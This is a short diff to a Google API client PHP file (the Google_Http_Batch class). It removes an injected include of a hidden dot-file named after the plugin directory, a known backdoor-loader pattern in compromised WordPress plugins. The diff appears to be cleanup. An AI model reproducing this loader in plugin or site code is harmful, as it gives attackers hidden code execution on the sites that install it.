@@ -28,10 +28,6 @@ use Psr\Http\Message\ResponseInterface;
  * requests. To start a new batch, be sure to create a new instance of this
  * class.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Google_Http_Batch
 {
   const BATCH_PATH = 'batch';
